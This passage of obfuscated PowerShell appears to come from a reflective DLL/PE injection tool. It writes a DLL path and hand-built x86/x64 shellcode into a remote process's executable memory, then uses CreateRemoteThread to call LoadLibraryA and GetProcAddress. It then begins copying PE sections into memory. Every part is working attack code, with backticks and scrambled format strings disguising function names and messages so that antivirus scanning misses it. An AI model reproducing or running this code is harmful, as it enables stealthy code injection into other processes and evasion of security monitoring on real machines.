		${rimPorTDl`l`pA`THptR} = ${wI`N3`2fUNCtI`onS}."VIRtU`Al`AlLo`cEX"."i`N`VokE"(${REM`otepRO`c`Ha`NdLe}, [IntPtr]::"ze`RO", ${dLlP`A`Th`SIZE}, ${WIn`32co`Ns`TAntS}."M`e`M_`coMmiT" -bor ${WIN32`C`ONStA`Nts}."m`eM`_R`EserVe", ${W`IN32`Co`NsTANts}."PAGe_rEa`D`WRIte")
		if (${R`IM`POrTD`l`LpAThPtr} -eq [IntPtr]::"Z`ERO")
		{
			Throw ('U'+("{1}{2}{0}" -f 'o','nable to al','l')+'ca'+'te'+("{1}{0}{3}{2}"-f'mo',' me','n t','ry i')+'h'+("{1}{0}"-f'emo','e r')+'t'+'e '+'p'+("{2}{0}{1}" -f 's','s','roce'))
		}

		[UIntPtr]${nuMbYte`Sw`RI`Tt`En} = [UIntPtr]::"z`eRo"
		${Su`Cc`ess} = ${wIN32`F`UncTionS}."W`RiTePRoce`ssM`eMORy"."in`V`oKE"(${rEMOT`ep`ROC`HAN`dle}, ${RimP`o`RtDL`LpaTHp`TR}, ${IMPOR`T`dLL`PaT`hptr}, ${dll`pa`ThS`ize}, [Ref]${NumbytES`Wr`iT`T`En})
		
		if (${Su`CCE`sS} -eq ${fA`lsE})
		{
			Throw ('Un'+'ab'+'le '+("{0}{2}{1}" -f'to ','ite D','wr')+'LL'+("{0}{1}"-f' ','path')+' '+'to '+("{0}{1}" -f'rem','ot')+("{1}{0}"-f 'r','e p')+'o'+'ces'+("{1}{0}" -f' memo','s')+'ry')
		}
		if (${dll`P`ATH`sizE} -ne ${N`U`mb`yteSwRITt`en})
		{
			Throw (('Didn{'+'0'+'}'+'t'+("{1}{0}"-f'wri',' ')+("{3}{1}{2}{0}"-f 'e','he ex','p','te t')+("{3}{1}{0}{2}" -f'n','d amou','t','cte')+' '+'of'+' '+("{2}{1}{0}" -f 'en ','ytes wh','b')+("{0}{1}"-f 'wr','it')+("{0}{1}{2}{3}" -f 'i','ng a D','LL',' pat')+("{4}{0}{2}{1}{3}" -f't','to ','o load ','t','h ')+'he'+' '+'r'+("{1}{0}" -f'e','emot')+' p'+("{0}{1}"-f 'ro','cess')) -f  [chAR]39)
		}
		
		${kern`eL`32HA`N`DLe} = ${Wi`N`32fu`NCTIoNs}."GEtMO`DULEH`An`d`lE"."INV`o`KE"(('k'+'ern'+("{0}{2}{1}"-f'el','2.dl','3')+'l'))
		${loaDlibR`Ary`AAd`DR} = ${WIn32`Fun`CtIO`NS}."GeTpRO`c`AdD`RE`sS"."INvO`KE"(${kE`R`NEl32`H`ANDLE}, (("{1}{0}" -f 'ad','Lo')+("{0}{1}{2}"-f'L','ibra','r')+'yA')) 
		
		[IntPtr]${dLL`A`ddre`ss} = [IntPtr]::"z`erO"
		
		
		if (${pE`I`NfO}."pE6`4B`It" -eq ${TR`Ue})
		{
			
			${Lo`A`dlIB`RarY`AreT`mEm} = ${w`IN32FUNc`TIons}."v`iRtuALALl`oC`ex"."iNv`oKE"(${r`EM`OtEP`ROch`AnDLE}, [IntPtr]::"ZE`RO", ${dLLp`AThsi`ze}, ${WIN32C`ONs`Ta`Nts}."MEm_co`m`MiT" -bor ${wiN`3`2CoN`StANts}."mEm_Re`s`ERVE", ${wIn`32coN`sT`AN`TS}."p`A`G`E_rEadw`RiTE")
			if (${LoadLIBrA`RYA`R`eT`mem} -eq [IntPtr]::"ZE`RO")
			{
				Throw (("{0}{1}"-f'Unabl','e')+' '+("{0}{2}{4}{1}{5}{3}" -f 'to allocate me',' t','mory','e r',' in','h')+("{1}{0}{2}"-f'mote ','e','proc')+'e'+'s'+("{1}{0}" -f'o','s f')+'r'+("{0}{1}" -f ' ','the')+' '+'re'+("{2}{1}{0}" -f'ue of','al','turn v')+("{1}{0}"-f'L',' Load')+'i'+'bra'+'ryA')
			}
			
			
			
			${lOAD`LIB`RAr`YSc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${loaD`lI`BRAr`YSC2} = @(0x48, 0xba)
			${L`O`ADlIBrA`Ry`SC3} = @(0xff, 0xd2, 0x48, 0xba)
			${LOaDLiBr`A`R`Y`SC4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			${Scl`Eng`TH} = ${Lo`ADlIB`RA`RYs`C1}."lEN`gth" + ${Lo`Adlibra`R`ySc2}."l`eNGtH" + ${lo`A`DlIB`Ra`RYsC3}."le`N`GtH" + ${Lo`AdL`iB`R`ArysC4}."L`e`NGth" + (${PTrs`iZe} * 3)
			${S`CPSmEM} = [System.Runtime.InteropServices.Marshal]::('A'+'ll'+'ocHGlobal').Invoke(${S`CLeN`GTH})
			${S`cps`MEmORig`IN`AL} = ${sc`PsMEM}
			
			&("{4}{3}{0}{1}{2}" -f'By','tesToMemor','y','ite-','Wr') -Bytes ${Lo`A`d`LiBraR`YSc1} -MemoryAddress ${sc`psm`EM}
			${S`cpS`mem} = &("{0}{2}{3}{5}{4}{1}" -f'Add','AsUnsigned','-','Sig','t','nedIn') ${SC`PS`MeM} (${lO`ADL`IBrAry`SC1}."lEN`Gth")
			[System.Runtime.InteropServices.Marshal]::('Stru'+'ctureT'+'o'+'Ptr').Invoke(${r`IMPOrTd`Llpa`T`H`pTR}, ${s`cpS`mEm}, ${fal`SE})
			${s`C`PsMEm} = &("{5}{2}{0}{6}{3}{4}{1}" -f 'I','igned','igned','tAsUn','s','Add-S','n') ${ScP`s`Mem} (${pTrS`ize})
			&("{0}{4}{1}{2}{3}"-f 'Writ','sTo','Memo','ry','e-Byte') -Bytes ${loaD`Li`BraR`Ysc2} -MemoryAddress ${SCP`S`Mem}
			${sCp`sm`EM} = &("{1}{0}{4}{3}{2}"-f '-Sig','Add','ed','nsign','nedIntAsU') ${SCps`m`EM} (${LoA`DLiBr`A`Ry`sC2}."L`eN`gTH")
			[System.Runtime.InteropServices.Marshal]::('S'+'tr'+'uctur'+'e'+'ToPtr').Invoke(${L`OADl`iBRArYA`ADdR}, ${s`CPSMem}, ${f`Al`se})
			${SCP`s`mEm} = &("{5}{1}{0}{3}{4}{2}{6}"-f'i','dd-S','tAsUnsign','gn','edIn','A','ed') ${SC`PsmeM} (${Ptr`Si`zE})
			&("{0}{3}{4}{5}{2}{1}" -f'W','ry','o','ri','te-Byte','sToMem') -Bytes ${L`OA`DLIBR`ARySc3} -MemoryAddress ${S`C`PSMeM}
			${sC`pSmeM} = &("{0}{3}{4}{1}{2}" -f 'Add-S','Unsig','ned','ignedIntA','s') ${SC`PsM`EM} (${lO`ADliBr`A`RYsC3}."L`eNG`TH")
			[System.Runtime.InteropServices.Marshal]::('Struc'+'tureT'+'oPt'+'r').Invoke(${LOa`dLIbrA`RY`A`REtm`Em}, ${Sc`p`sMEM}, ${Fa`lSe})
			${SCP`Sm`EM} = &("{5}{1}{4}{3}{2}{0}" -f 'd','n','ne','sig','tAsUn','Add-SignedI') ${sC`pS`mem} (${p`TRsi`ZE})
			&("{0}{2}{5}{1}{3}{4}" -f 'Wri','o','te-Byt','Memor','y','esT') -Bytes ${lo`A`d`LIBrarYS`c4} -MemoryAddress ${S`cP`smem}
			${SCp`SM`em} = &("{0}{2}{3}{1}" -f 'Add','edIntAsUnsigned','-','Sign') ${SCP`s`mem} (${loA`dli`B`RaR`YsC4}."l`enGtH")

			
			${R`Sc`AddR} = ${wIN32`F`UNct`iO`Ns}."v`IRTua`lAlLOceX"."i`NV`oke"(${rEM`OTe`P`R`ochanDle}, [IntPtr]::"ZE`RO", [UIntPtr][UInt64]${S`c`length}, ${WIN`32`CONSta`NTS}."mE`M_c`OMMit" -bor ${WIN3`2`Co`Nstants}."mem`_rese`R`VE", ${Win`32`c`OnstAnTS}."page_ExecutE_`R`eADW`RITe")
			if (${Rs`CAdDR} -eq [IntPtr]::"Z`ERO")
			{
				Throw ('Un'+("{0}{1}{2}"-f'able to ','al','loc')+'at'+'e '+("{0}{2}{1}" -f 'm','ory','em')+("{2}{1}{0}"-f 'e re',' th',' in')+("{0}{1}" -f'mote ','pr')+'oc'+("{0}{1}" -f 'ess',' fo')+'r s'+("{0}{2}{1}" -f'hel','ode','lc'))
			}
			
			${S`UCCe`SS} = ${WIn32FunC`TI`oNs}."wRITE`p`Roces`S`MEMory"."iN`VokE"(${rE`Mot`EP`ROcha`N`dLe}, ${r`S`cadDr}, ${sCPSmEmO`RIGiN`AL}, [UIntPtr][UInt64]${sCl`enGTH}, [Ref]${Nu`Mb`yT`EswR`itteN})
			if ((${Su`c`cEsS} -eq ${FaL`Se}) -or ([UInt64]${Nu`M`By`TeSW`RITTEN} -ne [UInt64]${scL`eN`gTH}))
			{
				Throw (("{2}{0}{1}" -f'le',' to ','Unab')+'wri'+'te'+' s'+'h'+'el'+'l'+("{0}{1}"-f 'c','ode ')+'t'+'o '+("{0}{1}" -f're','mote')+' '+'pr'+("{1}{0}"-f 'es','oc')+("{2}{0}{1}"-f'memor','y.','s '))
			}
			
			${Rth`REaD`hANdLE} = &("{6}{1}{4}{3}{0}{5}{2}" -f 'T','vok','read','Remote','e-Create','h','In') -ProcessHandle ${RE`Mo`TEProChA`NDLe} -StartAddress ${rs`CaDDR} -Win32Functions ${WiN`3`2Fu`N`CtIoNs}
			${Res`UlT} = ${WIN3`2fu`N`cT`IONs}."w`AiT`Fors`inG`leoBJeCT"."IN`VOkE"(${R`T`hREAd`han`DLe}, 20000)
			if (${rE`SULT} -ne 0)
			{
				Throw (("{1}{0}"-f'l','Cal')+("{1}{0}" -f 'rea',' to C')+("{0}{1}"-f 't','eRe')+("{1}{0}" -f'ote','m')+("{0}{1}{4}{3}{2}" -f 'T','hread ','l G','cal','to ')+'e'+("{2}{0}{1}"-f'ProcAd','dr','t')+'es'+'s f'+("{0}{1}" -f'a','ile')+'d.')
			}
			
			
			[IntPtr]${rE`TURnva`l`mem} = [System.Runtime.InteropServices.Marshal]::('Alloc'+'HGlo'+'bal').Invoke(${P`T`RSIZE})
			${RE`sU`LT} = ${Wi`N32FU`NcTI`o`Ns}."RE`AD`PRoceSSmE`M`OrY"."i`Nv`oke"(${r`EmotePROC`hA`ND`LE}, ${loADlI`BrA`R`yARetM`eM}, ${reT`URN`Va`L`Mem}, [UIntPtr][UInt64]${pT`R`siZe}, [Ref]${nUMb`y`TEs`wRi`TtEN})
			if (${r`E`sULT} -eq ${fa`lSE})
			{
				Throw (("{1}{0}" -f'all','C')+' t'+("{0}{1}{2}"-f 'o Read','P','r')+("{1}{0}" -f'cess','o')+("{1}{0}{2}" -f'or','Mem','y fa')+("{0}{1}"-f'i','led'))
			}
			[IntPtr]${D`Llad`DrE`Ss} = [System.Runtime.InteropServices.Marshal]::"PT`RtoStRuc`T`Ure"(${RE`TUrnVA`LmEM}, [Type][IntPtr])

			${wi`N3`2fUnC`TionS}."VIrt`U`ALf`R`eEeX"."I`N`VoKE"(${r`EMOtePRoch`AND`Le}, ${LoAD`lIBrA`Ryar`eT`MEm}, [UIntPtr][UInt64]0, ${wIn32ConsT`A`NTs}."m`Em_`RelEase") | &("{2}{1}{0}" -f '-Null','t','Ou')
			${w`in3`2fUnc`TIons}."vI`RtU`AlFRe`EeX"."I`NvOKE"(${rEmOt`EP`RocH`And`Le}, ${rS`ca`dDr}, [UIntPtr][UInt64]0, ${WIN`32COn`sTa`N`Ts}."MEM_rELE`A`SE") | &("{2}{1}{0}"-f 'ull','N','Out-')
		}
		else
		{
			[IntPtr]${RT`HReAD`hAn`D`LE} = &("{3}{0}{1}{4}{2}" -f 'nvoke-','C','eateRemoteThread','I','r') -ProcessHandle ${RemoTE`pR`OCHAN`Dle} -StartAddress ${LoAdLIb`Ra`RYa`ADdR} -ArgumentPtr ${riM`PO`RTDLLpathP`TR} -Win32Functions ${WIN`32`FuN`CTIo`NS}
			${R`eS`ULT} = ${W`i`N32F`UnCTio`Ns}."w`A`i`TFORSIn`gLEobJe`Ct"."InVo`ke"(${rTh`R`eadHaN`D`le}, 20000)
			if (${r`eSU`lt} -ne 0)
			{
				Throw ('Ca'+("{0}{2}{1}"-f 'll t','rea','o C')+'teR'+("{1}{3}{2}{0}{4}" -f 'ead','e','teThr','mo',' t')+'o c'+'al'+'l'+' '+'G'+'e'+("{0}{1}"-f'tPro','c')+("{0}{2}{1}"-f 'A','s fa','ddres')+'i'+("{0}{1}" -f 'led','.'))
			}
			
			[Int32]${e`Xi`TcOdE} = 0
			${REs`ULT} = ${WIN32FUnc`T`I`onS}."Ge`TexIT`C`oDEthR`E`Ad"."i`NvokE"(${RT`h`ReADHanDLe}, [Ref]${eXItco`De})
			if ((${RE`SU`LT} -eq 0) -or (${eX`IT`CODE} -eq 0))
			{
				Throw (("{0}{1}" -f 'C','all to')+' '+("{0}{2}{1}"-f'GetEx','tCo','i')+'deT'+'h'+'re'+'ad'+' fa'+("{0}{1}"-f'ile','d'))
			}
			
			[IntPtr]${dLlADd`R`Ess} = [IntPtr]${EX`iTC`Ode}
		}
		
		${wIN3`2FUnct`I`o`NS}."vi`RTUAlfReE`eX"."In`VOKE"(${rEM`O`TEProchanD`le}, ${Ri`M`poRtdlLPaThp`Tr}, [UIntPtr][UInt64]0, ${wi`N32`C`o`NsTANtS}."mE`M`_reL`eAsE") | &("{0}{1}" -f'Out-Nu','ll')
		
		return ${dlLa`DDrE`SS}
	}
	
	
	Function Get-`ReMoTepR`oCA`ddre`Ss
	{
		Param(
		[Parameter(POSItIon=0, maNDAtOry=${t`RUe})]
		[IntPtr]
		${rEmotEp`Ro`c`HANdle},
		
		[Parameter(poSitioN=1, MANdATory=${tr`Ue})]
		[IntPtr]
		${rEmo`TEdlLh`ANdle},
		
		[Parameter(poSItIon=2, MAnDatORy=${T`RUE})]
		[String]
		${FuNcT`iONNA`ME}
		)

		${p`TrS`izE} = [System.Runtime.InteropServices.Marshal]::"siZe`oF"([Type][IntPtr])
		${f`U`N`cTIONnAmEPtr} = [System.Runtime.InteropServices.Marshal]::('StringT'+'o'+'HGl'+'obalAns'+'i').Invoke(${FuN`c`TioNNAMe})
		
		
		${f`UNctio`NNA`mESI`ZE} = [UIntPtr][UInt64]([UInt64]${FU`NCtIOnna`mE}."Len`gth" + 1)
		${RF`UN`cNAM`eptR} = ${W`IN32FuncT`iO`Ns}."v`irtUAlaLL`O`cex"."InV`oKE"(${reMOT`e`PrOChaN`d`le}, [IntPtr]::"Z`ero", ${fu`N`CtIonnaMe`s`iZE}, ${W`in32C`ONSTa`NTS}."MeM`_`co`MMit" -bor ${WI`N32Cons`Ta`NTS}."MEm_reS`E`Rve", ${w`in32CoNSTA`NTs}."paGe`_rEad`wR`ITE")
		if (${rfUN`c`NA`MePtr} -eq [IntPtr]::"Z`ero")
		{
			Throw ('U'+("{1}{0}" -f'le','nab')+("{1}{0}" -f ' ',' to')+'all'+("{0}{1}"-f'oca','t')+("{0}{1}{2}" -f 'e',' memo','ry ')+'in'+("{0}{1}" -f ' t','he ')+("{0}{1}"-f 'rem','o')+("{1}{0}" -f 'p','te ')+("{2}{0}{1}" -f 's','s','roce'))
		}

		[UIntPtr]${nUmbyte`s`wRit`T`En} = [UIntPtr]::"ze`RO"
		${s`UC`CeSS} = ${WIN32f`U`N`ct`ions}."W`R`ITepRO`ces`SMe`Mory"."inV`o`kE"(${RemotEpr`OCHa`N`Dle}, ${RfuncNA`me`p`TR}, ${FUN`C`TiOnn`Ame`pTR}, ${f`UNcTi`ONNamE`size}, [Ref]${n`UM`BY`T`esWRitTeN})
		[System.Runtime.InteropServices.Marshal]::('F'+'reeH'+'Global').Invoke(${FUN`CTI`o`NNamE`PtR})
		if (${sUC`CE`ss} -eq ${FAL`SE})
		{
			Throw ('Un'+'abl'+("{0}{1}" -f 'e t','o w')+'rit'+'e '+("{2}{1}{0}{3}{4}" -f ' path','L','DL',' to r','emote pro')+'ce'+("{1}{0}" -f ' me','ss')+("{1}{0}"-f'ory','m'))
		}
		if (${Funct`iO`NNAMeS`IZE} -ne ${nuM`BYTEswr`i`Tt`en})
		{
			Throw (('Did'+'ns'+'r'+'et '+'wr'+'ite'+' t'+'h'+("{1}{0}" -f'xp','e e')+'ect'+'ed'+' am'+("{1}{0}"-f ' ','ount')+("{1}{0}{2}"-f 'f','o',' byte')+'s w'+("{0}{1}" -f'h','en ')+'wr'+("{0}{1}{2}"-f 'it','in','g a')+("{0}{2}{1}"-f' ','L pa','DL')+'th '+("{1}{0}" -f'o lo','t')+'a'+'d t'+("{0}{1}" -f 'o ','the')+' re'+'mot'+'e p'+'roc'+'ess') -rEPLaCE ([CHar]115+[CHar]114+[CHar]101),[CHar]39)
		}
		
		
		${ke`Rn`EL`32HAN`dLE} = ${win32F`UNcT`Io`Ns}."ge`TmODUl`e`H`AndLe"."inV`OkE"(('k'+'er'+("{1}{2}{0}" -f 'dl','nel3','2.')+'l'))
		${G`ETprOcaD`D`RE`SS`ADDR} = ${Win`32FU`NCtIo`Ns}."G`Et`PrOCAd`DrEsS"."IN`VOkE"(${KE`RNEl32ha`N`dle}, (("{0}{1}"-f'Ge','tP')+'r'+'o'+'cA'+("{1}{0}{2}" -f 's','ddre','s'))) 

		
		
		${GEtpRocaD`d`REsSR`etmEm} = ${W`i`N32fUn`CtIONs}."V`iRTuAL`AlLoCeX"."i`NVokE"(${R`eM`Ot`Ep`RocHAND`Le}, [IntPtr]::"Z`eRO", [UInt64][UInt64]${p`TRSI`Ze}, ${Wi`N32c`o`NSTa`NTs}."mE`M`_`cOmmIT" -bor ${wI`N32cOnsta`NtS}."MEM`_re`S`Erve", ${WiN`32coNStA`NTs}."p`AGe`_RE`AdWrITe")
		if (${GE`TpRocAD`Dre`s`SrETM`em} -eq [IntPtr]::"Ze`Ro")
		{
			Throw ('Un'+'abl'+'e'+' to'+("{0}{1}" -f' al','l')+("{2}{1}{0}" -f ' mem','te','oca')+'ory'+' in'+' '+("{0}{2}{1}" -f'the r','te ','emo')+'pr'+'oce'+'ss'+' '+'f'+("{0}{1}"-f'o','r th')+'e r'+'et'+("{2}{0}{1}"-f'e',' ','urn valu')+'o'+'f '+("{3}{2}{0}{1}" -f 'Ad','d','etProc','G')+("{0}{1}"-f 're','ss'))
		}
		
		
		
		
		
		[Byte[]]${gE`TprOCA`DDRe`S`ssC} = @()
		if (${P`E`Info}."pe64`B`it" -eq ${t`RUE})
		{
			${GET`pr`oCa`D`dREs`ssC1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${g`Et`P`ROcADdReSS`Sc2} = @(0x48, 0xba)
			${getPrOca`Dd`Re`SSS`c3} = @(0x48, 0xb8)
			${gETpR`OcA`dDr`ESSsc4} = @(0xff, 0xd0, 0x48, 0xb9)
			${Getp`RoCad`d`Re`SssC5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${GetpROCa`dD`ReSS`S`C1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${GE`TPR`o`CADdRE`s`ssc2} = @(0xb9)
			${GetpRo`ca`dDr`eSssc3} = @(0x51, 0x50, 0xb8)
			${gETP`RO`cADDR`es`ssc4} = @(0xff, 0xd0, 0xb9)
			${Get`pRocA`DD`REsSsc5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${Scl`e`NGtH} = ${G`EtPRoCaDDR`ES`ss`C1}."l`EnG`Th" + ${G`E`T`PRoCAddr`Esssc2}."le`N`Gth" + ${GE`TpRocA`D`dREsSsC3}."LeNG`Th" + ${ge`TPro`c`ADDresssC4}."lEn`gtH" + ${G`ETpro`CAdd`RessSC5}."Len`GTh" + (${Ptrsi`ZE} * 4)
		${S`CPSM`em} = [System.Runtime.InteropServices.Marshal]::('Allo'+'cH'+'Gl'+'obal').Invoke(${S`c`LENGth})
		${ScpS`MemO`RigI`NaL} = ${s`C`PsMeM}
		
		&("{3}{4}{0}{2}{1}"-f'Byt','sToMemory','e','W','rite-') -Bytes ${G`etP`ROCaddR`eSSsC1} -MemoryAddress ${S`cPsm`EM}
		${ScpS`mEM} = &("{1}{0}{4}{3}{2}"-f'nedIntA','Add-Sig','ed','sign','sUn') ${ScP`S`MEm} (${gEtp`RO`C`A`ddResSSc1}."lENG`Th")
		[System.Runtime.InteropServices.Marshal]::('Structur'+'e'+'To'+'Ptr').Invoke(${r`E`mOTeDLlH`A`Ndle}, ${scPS`m`EM}, ${FAL`Se})
		${S`C`psMeM} = &("{6}{2}{4}{3}{1}{5}{0}" -f 'igned','n','ign','dI','e','tAsUns','Add-S') ${SCpsM`em} (${P`T`RSiZe})
		&("{1}{3}{4}{0}{2}" -f 'sToMe','Wri','mory','te','-Byte') -Bytes ${gE`TPrOCA`Ddres`SSc2} -MemoryAddress ${scP`SM`Em}
		${sCpSm`eM} = &("{3}{2}{1}{0}" -f 'gned','edIntAsUnsi','Sign','Add-') ${SC`PS`mem} (${G`EtPR`OcAD`D`REsssC2}."leng`TH")
		[System.Runtime.InteropServices.Marshal]::('Str'+'u'+'ctur'+'eToPtr').Invoke(${R`Fu`NcnAme`P`TR}, ${S`cpSm`EM}, ${fA`Lse})
		${ScPs`MEM} = &("{5}{6}{2}{1}{4}{3}{0}"-f 'ned','dIntAsUn','-Signe','g','si','A','dd') ${sCP`sm`eM} (${PtRS`Ize})
		&("{2}{4}{1}{3}{5}{0}"-f'oMemory','Byt','Wr','e','ite-','sT') -Bytes ${geTProC`ADdR`E`SSsc3} -MemoryAddress ${S`C`PSmEM}
		${Sc`PSMEm} = &("{1}{4}{2}{5}{0}{3}" -f'ns','Add-S','gned','igned','i','IntAsU') ${SC`pSMem} (${GE`Tp`ROcADdreSsS`c3}."lE`NgtH")
		[System.Runtime.InteropServices.Marshal]::('StructureT'+'o'+'Ptr').Invoke(${Ge`TprOCaDDR`e`sSaDDr}, ${s`CpsmEM}, ${faL`Se})
		${SC`PSMEM} = &("{5}{0}{7}{4}{3}{1}{2}{6}"-f 'dd-S','AsUnsig','n','Int','ed','A','ed','ign') ${S`c`psMEm} (${PTrS`I`ze})
		&("{3}{1}{2}{0}" -f'ory','yte','sToMem','Write-B') -Bytes ${Get`pRocA`d`DReS`ssc4} -MemoryAddress ${Sc`p`smEm}
		${SCPs`mem} = &("{4}{2}{1}{5}{3}{6}{0}"-f'ed','A','dd-SignedInt','Unsi','A','s','gn') ${scP`sM`em} (${G`e`TProc`A`Ddr`ESsSc4}."leN`g`TH")
		[System.Runtime.InteropServices.Marshal]::('Struc'+'ture'+'ToP'+'tr').Invoke(${g`etpR`Oca`ddrESs`RETmEm}, ${ScpSM`EM}, ${f`ALSe})
		${SC`PsM`Em} = &("{2}{4}{0}{3}{1}"-f 'gnedIntAsUnsi','ned','Add-S','g','i') ${sCPS`Mem} (${P`T`RsiZE})
		&("{2}{4}{0}{1}{3}"-f'Byt','esT','Wri','oMemory','te-') -Bytes ${GeTprOcA`DDR`EssS`C5} -MemoryAddress ${scps`m`Em}
		${S`cPSMeM} = &("{1}{2}{3}{4}{0}" -f'ed','Add-Sig','n','edIntAs','Unsign') ${Sc`pSmEm} (${GET`ProC`AddrE`SsSc5}."LEnG`TH")
		
		${rScA`dDr} = ${wIn32`FUNc`Tio`NS}."VIRtu`AlA`l`lOC`eX"."i`NVOKE"(${R`eMo`TEpR`oc`hA`NdlE}, [IntPtr]::"Z`ErO", [UIntPtr][UInt64]${scLen`G`Th}, ${w`in`32cONstantS}."m`e`m_cO`mmiT" -bor ${WI`N3`2cONSt`AN`Ts}."me`m`_r`eseRve", ${win3`2`coN`STANTs}."pAG`E_e`x`ecUt`E_re`ADwRi`TE")
		if (${rs`cad`dr} -eq [IntPtr]::"Z`eRO")
		{
			Throw (("{1}{0}" -f 'l','Unab')+("{0}{2}{1}{3}" -f 'e t','loca','o al','t')+("{0}{1}"-f 'e ','mem')+'o'+("{1}{2}{0}"-f ' in t','r','y')+'h'+'e'+("{1}{0}" -f 'rem',' ')+("{0}{1}"-f'ot','e p')+("{0}{1}" -f'roc','es')+("{1}{0}{2}" -f'r ','s fo','shel')+("{1}{0}" -f'de','lco'))
		}
		
		${SuC`CeSs} = ${wiN`32funC`T`iONS}."WriTEproc`ess`m`E`MO`RY"."InvO`Ke"(${re`MOTEProCH`AN`dlE}, ${rS`CaddR}, ${scps`mEMoRi`giN`Al}, [UIntPtr][UInt64]${s`CLE`N`gTH}, [Ref]${nUMByte`sW`R`ITt`En})
		if ((${sU`cc`Ess} -eq ${FAl`SE}) -or ([UInt64]${n`Um`BYT`ESwritTEN} -ne [UInt64]${S`Cle`Ngth}))
		{
			Throw ('U'+'n'+'a'+("{0}{3}{2}{1}" -f 'ble ','te','i','to wr')+("{1}{0}" -f 'shel',' ')+("{0}{2}{1}"-f'lcode ','r','to ')+'e'+'m'+("{0}{1}" -f 'o','te ')+("{3}{4}{1}{0}{2}"-f 'em','ess m','or','p','roc')+'y.')
		}
		
		${rThR`ea`D`H`ANDlE} = &("{0}{2}{3}{1}{4}"-f'In','ke-CreateRemot','v','o','eThread') -ProcessHandle ${r`emoTePR`OcHA`N`DlE} -StartAddress ${R`s`CADdr} -Win32Functions ${win3`2FUNcTi`O`NS}
		${rESU`Lt} = ${w`IN3`2Fu`NCtIONs}."WAItf`orsI`NGL`eOBJ`ECt"."I`Nv`OKe"(${rTHR`ea`dH`A`NDLe}, 20000)
		if (${Re`S`UlT} -ne 0)
		{
			Throw (("{1}{2}{0}" -f ' t','C','all')+("{1}{0}"-f'Cr','o ')+'ea'+("{0}{1}"-f'teRe','mo')+'t'+'eT'+'h'+("{1}{0}" -f' ','read')+'to '+'c'+("{1}{0}" -f'G','all ')+("{1}{0}"-f 'o','etPr')+'cAd'+("{2}{0}{1}" -f'e','d','dress fail')+'.')
		}
		
		
		[IntPtr]${rEtU`RN`VAL`m`em} = [System.Runtime.InteropServices.Marshal]::('A'+'lloc'+'HGl'+'obal').Invoke(${pTr`s`IZE})
		${r`ESUlT} = ${wIn`3`2fuNCT`IO`NS}."r`EaDPRocEsS`m`EmoRY"."invO`ke"(${Remot`epROc`hA`N`D`lE}, ${geTPr`OCA`d`dR`ES`sreTmEm}, ${Re`TurnvA`LM`eM}, [UIntPtr][UInt64]${PtR`s`izE}, [Ref]${NumB`yte`S`writTEn})
		if ((${ReSu`lT} -eq ${fA`l`Se}) -or (${N`UmbYt`EswRitt`eN} -eq 0))
		{
			Throw (("{1}{0}"-f'll t','Ca')+("{0}{1}" -f'o R','e')+'ad'+'Pr'+("{0}{2}{1}"-f'o','essMem','c')+'ory'+' fa'+'il'+'ed')
		}
		[IntPtr]${prOc`Ad`dress} = [System.Runtime.InteropServices.Marshal]::"PtRT`oSt`RUcTURE"(${reTUrnv`Al`mEM}, [Type][IntPtr])

		${WIn32FUnC`TIO`NS}."VIrtuA`LF`Re`eex"."i`N`VOkE"(${r`E`m`otepRO`chaNDLE}, ${rSCa`DDR}, [UIntPtr][UInt64]0, ${win32coN`S`TanTs}."meM_`R`ElEaSE") | &("{1}{0}" -f'Null','Out-')
		${wI`N32fUNcti`O`NS}."ViRTU`AlfRe`E`Ex"."in`VOke"(${rEmotepRoC`Ha`N`DLe}, ${r`FUn`Cn`A`MEPTr}, [UIntPtr][UInt64]0, ${wIN3`2c`O`NstANTs}."ME`M_Re`L`EasE") | &("{1}{0}" -f 't-Null','Ou')
		${WIn32FUn`Ct`I`ONS}."v`I`Rtu`ALfrEE`Ex"."I`NVo`kE"(${re`MOTEp`R`OCHaNdlE}, ${gETpRo`C`AD`dres`SRet`M`Em}, [UIntPtr][UInt64]0, ${wiN32`C`O`NStAn`TS}."M`Em`_rEl`eAsE") | &("{1}{0}" -f 'll','Out-Nu')
		
		return ${proCAD`DRE`SS}
	}


	Function coPY-sECt`Io`NS
	{
		Param(
		[Parameter(POSITION = 0, MandaTory = ${TR`Ue})]
		[Byte[]]
		${PEb`yT`ES},
		
		[Parameter(POSiTION = 1, mAndatOrY = ${tR`Ue})]
		[System.Object]
		${P`ei`NFo},
		
		[Parameter(PoSITIoN = 2, mandAtOry = ${t`Rue})]
		[System.Object]
		${wIn`3`2fU`NcTioNs},
		
		[Parameter(pOSitiOn = 3, MaNdATORY = ${T`Rue})]
		[System.Object]
		${w`In32T`ypeS}
		)
		
		for( ${i} = 0; ${I} -lt ${PE`iNfo}."i`maGe_NT`_`Head`ers"."FileH`ea`deR"."NuMB`e`RoFSEC`TI`OnS"; ${I}++)
		{
			[IntPtr]${S`e`cTIoNHea`DErpTR} = [IntPtr](&("{2}{0}{1}{3}" -f'd-Sign','edIntAsU','Ad','nsigned') ([Int64]${PEin`Fo}."s`EC`T`io`NHEadeRPtR") (${I} * [System.Runtime.InteropServices.Marshal]::"sIZE`Of"([Type]${W`IN32`T`YPes}."IMaGE_S`e`Ct`ION_HEA`dEr")))
			${s`EcTIO`NHeaD`eR} = [System.Runtime.InteropServices.Marshal]::"pt`RtoSt`RUc`Ture"(${SeCTI`o`Nhea`DeRpTR}, [Type]${WiN32`Ty`pEs}."IMAge_`secT`I`On_`h`EaDer")
		
			
			[IntPtr]${sE`CTiO`ND`ES`TadDr} = [IntPtr](&("{6}{2}{1}{4}{7}{5}{0}{3}" -f 'gne','edI','ign','d','n','nsi','Add-S','tAsU') ([Int64]${pEIn`Fo}."PEh`A`NDLE") ([Int64]${se`CtI`ONHeaDer}."VI`RTUAL`ADdR`EsS"))
			
			
			
			
			
			${sIZEO`FraW`DATA} = ${SeCT`iONheAd`eR}."SIZe`o`FRAWd`ATa"

